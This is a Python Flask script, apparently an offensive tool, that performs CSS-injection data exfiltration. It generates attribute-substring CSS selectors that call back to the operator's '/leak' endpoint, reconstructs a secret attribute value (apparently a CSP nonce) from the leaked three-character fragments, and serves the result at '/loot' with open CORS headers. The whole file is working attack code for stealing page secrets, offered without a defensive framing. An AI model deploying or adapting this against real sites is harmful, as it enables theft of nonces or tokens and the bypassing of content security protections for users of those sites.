from flask import Flask, request, Response
import itertools
import argparse
import time
app = Flask(__name__)
nonce_substr = set()
loot = ""

def generate_substrings(charset, length):
    return [''.join(combination) for combination in itertools.product(charset, repeat=length)]

def generate_css(substrings, base_url, tag, attr):
    css_rules = []
    for substring in substrings:
        css_rules.append(f"{tag}[{attr}*='{substring}']{{ --{substring}: url('{base_url}/leak?x={substring}'); }}")
    cross_fade_expressions = []
    for i in range(0, len(substrings) - 3, 4):
        cross_fade_expression = (
            f"-webkit-cross-fade("
            f"-webkit-cross-fade(var(--{substrings[i]}, none), var(--{substrings[i + 1]}, none), 50%), "
            f"-webkit-cross-fade(var(--{substrings[i + 2]}, none), var(--{substrings[i + 3]}, none), 50%), "
            f"50%)"
        )

        cross_fade_expressions.append(cross_fade_expression)
    css_rules.append(f"{tag}{{display:block;}}{tag} {{ background-image: {', '.join(cross_fade_expressions)}; }}")
    return '\n'.join(css_rules)


def retrieve_nonce(substrings, nonce_len):
    if not substrings:
        return ""

    def best_overlap(s1, s2):
        max_overlap = min(len(s1), len(s2))
        for i in range(max_overlap, 0, -1):
            if s1.endswith(s2[:i]) or s2.endswith(s1[:i]):
                return i
        return 0
    time.sleep(0.1)
    nonce = substrings.pop(0)
    while substrings:
        next_substring = max(substrings, key=lambda x: best_overlap(nonce, x))
        substrings.remove(next_substring)
        overlap = best_overlap(nonce, next_substring)
        if nonce.endswith(next_substring[:overlap]):
            nonce += next_substring[overlap:]
        else:
            nonce = next_substring[:-overlap] + nonce
    return nonce



@app.route('/leak')
def generate_leak():
    global nonce_substr, loot
    x = request.args.get('x')
    if x:
        nonce_len = args.nonce_len
        nonce_substr.add(x)
        nonce_copy = nonce_substr.copy()
        nonce = retrieve_nonce(list(nonce_copy), nonce_len)
        if len(nonce) == nonce_len and nonce is not None:
            print(f'[+] leaked {args.attr}: {nonce}')
            loot = nonce
            nonce_substr = set()
        return ''
    else:
        substrings = generate_substrings(args.charset, 3)
        css_content = generate_css(substrings, args.base_url, args.tag, args.attr)
        return Response(css_content, mimetype='text/css')


@app.route('/loot')
def loot():
    try:
        if len(loot) == args.nonce_len:
            response = Response(loot, mimetype='text/plain')
            response.headers['Access-Control-Allow-Origin'] = '*'
            response.headers['Access-Control-Allow-Credentials'] = 'true'

            return response
        else:
            return ''
    except:
        return ''


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Run the Flask app with specified parameters.')
    parser.add_argument('--base_url', type=str, required=True, help='Base URL for CSS leak callbacks')
    parser.add_argument('--nonce_len', type=int, required=True, help='Length of attribute')
    parser.add_argument('--tag', type=str, required=True, help='HTML tag to which nonce is applied')
    parser.add_argument('--attr', type=str, required=True, help='Attribute in the tag to which nonce is applied')
    parser.add_argument('--port', type=str, required=True, help='Port to connect to')
    parser.add_argument('--charset', type=str, default='abcdefghijklmnopqrstuvwxyz0123456789',
                        help='Charset used for generating substrings')
    args = parser.parse_args()
    app.run(host='0.0.0.0', port=int(args.port))
